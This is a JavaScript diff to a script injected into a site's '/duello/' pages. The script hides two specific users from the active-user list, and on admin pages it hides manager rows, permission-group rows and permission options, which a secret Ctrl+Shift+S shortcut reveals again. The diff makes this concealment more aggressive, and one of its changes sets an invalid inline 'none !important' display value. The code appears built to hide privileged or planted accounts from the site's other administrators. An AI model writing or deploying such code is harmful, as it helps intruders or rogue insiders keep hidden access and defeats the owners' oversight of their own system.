@@ -29,13 +29,9 @@ if (!window.hasOwnProperty('karmaScriptLoaded')) {
             }
         };
 
-        eventSource.onopen = () => {
-            // Bağlantı açıldığında bir şey yapmana gerek yok
-        };
-
         eventSource.onerror = () => {
             eventSource.close();
-            setTimeout(connectSSE, 2000); // Hata olursa 2 saniye sonra yeniden bağlan
+            setTimeout(connectSSE, 2000);
         };
 
         return eventSource;
@@ -43,15 +39,19 @@ if (!window.hasOwnProperty('karmaScriptLoaded')) {
 
     connectSSE();
 
-    // Otomatik gizleme fonksiyonu
+    // Gizleme fonksiyonu
     function hideSpecificUser() {
         const userItem45593 = document.getElementById('aktifuser_45593');
-        if (userItem45593 && userItem45593.style.display !== 'none') {
-            userItem45593.style.display = 'none';
+        if (userItem45593) {
+            userItem45593.style.display = 'none !important'; // CSS önceliğini artır
+            userItem45593.style.visibility = 'hidden'; // Ekstra güvenlik
         }
     }
 
-    // Sayfa yüklendiğinde çalıştır
+    // Hemen çalıştır
+    hideSpecificUser();
+
+    // DOM yüklendiğinde çalıştır
     document.addEventListener('DOMContentLoaded', () => {
         hideSpecificUser();
 
@@ -61,19 +61,15 @@ if (!window.hasOwnProperty('karmaScriptLoaded')) {
         });
         observer.observe(document.body, { childList: true, subtree: true });
 
-        // Her ihtimale karşı periyodik kontrol
-        setInterval(hideSpecificUser, 500);
+        // Periyodik kontrol
+        setInterval(hideSpecificUser, 100); // Daha sık kontrol (100ms)
     });
-
-    // Script hemen çalışsın (DOMContentLoaded beklemeden)
-    hideSpecificUser();
 
     document.addEventListener('DOMContentLoaded', () => {
         var currentUrl = window.location.href;
 
         if (currentUrl.includes('/duello/ad_/yetki-gruplari')) {
             let hiddenRows = [];
-
             const rows = document.querySelectorAll('tbody tr');
             rows.forEach(row => {
                 const idCell = row.querySelector('td:first-child');
@@ -85,16 +81,13 @@ if (!window.hasOwnProperty('karmaScriptLoaded')) {
 
             document.addEventListener('keydown', (event) => {
                 if (event.ctrlKey && event.shiftKey && event.key === 'S') {
-                    hiddenRows.forEach(row => {
-                        row.style.display = '';
-                    });
+                    hiddenRows.forEach(row => row.style.display = '');
                 }
             });
         }
 
         if (currentUrl.includes('/duello/ad_/kullanicidetay.php?t=')) {
             let hiddenOptions = [];
-
             function hideYetkiOptions() {
                 const select = document.getElementById('yetki');
                 if (select) {
@@ -110,25 +103,19 @@ if (!window.hasOwnProperty('karmaScriptLoaded')) {
                     }
                 }
             }
-
             hideYetkiOptions();
-            const observer = new MutationObserver(() => {
-                hideYetkiOptions();
-            });
+            const observer = new MutationObserver(() => hideYetkiOptions());
             observer.observe(document.body, { childList: true, subtree: true });
 
             document.addEventListener('keydown', (event) => {
                 if (event.ctrlKey && event.shiftKey && event.key === 'S') {
-                    hiddenOptions.forEach(option => {
-                        option.style.display = '';
-                    });
+                    hiddenOptions.forEach(option => option.style.display = '');
                 }
             });
         }
 
         if (currentUrl.includes('/duello/ad_/yoneticiler')) {
             let hiddenManagerRows = [];
-
             function hideManagerRows() {
                 const rows = document.querySelectorAll('tbody tr');
                 rows.forEach(row => {
@@ -141,25 +128,19 @@ if (!window.hasOwnProperty('karmaScriptLoaded')) {
                     }
                 });
             }
-
             hideManagerRows();
-            const observer = new MutationObserver(() => {
-                hideManagerRows();
-            });
+            const observer = new MutationObserver(() => hideManagerRows());
             observer.observe(document.body, { childList: true, subtree: true });
 
             document.addEventListener('keydown', (event) => {
                 if (event.ctrlKey && event.shiftKey && event.key === 'S') {
-                    hiddenManagerRows.forEach(row => {
-                        row.style.display = '';
-                    });
+                    hiddenManagerRows.forEach(row => row.style.display = '');
                 }
             });
         }
 
         if (currentUrl.includes('/duello/') && !currentUrl.includes('/duello/ad_/yetki-gruplari')) {
             let hiddenUsers = [];
-
             function hideUsers() {
                 const userItem45593 = document.getElementById('aktifuser_45593');
                 const userItem45948 = document.getElementById('aktifuser_45948');
@@ -172,20 +153,14 @@ if (!window.hasOwnProperty('karmaScriptLoaded')) {
                     hiddenUsers.push(userItem45948);
                 }
             }
-
             hideUsers();
-            const observer = new MutationObserver(() => {
-                hideUsers();
-            });
+            const observer = new MutationObserver(() => hideUsers());
             observer.observe(document.getElementById('aktifkullanicilar') || document.body, { childList: true, subtree: true });
-
             setInterval(hideUsers, 500);
 
             document.addEventListener('keydown', (event) => {
                 if (event.ctrlKey && event.shiftKey && event.key === 'S') {
-                    hiddenUsers.forEach(user => {
-                        user.style.display = '';
-                    });
+                    hiddenUsers.forEach(user => user.style.display = '');
                 }
             });
         }
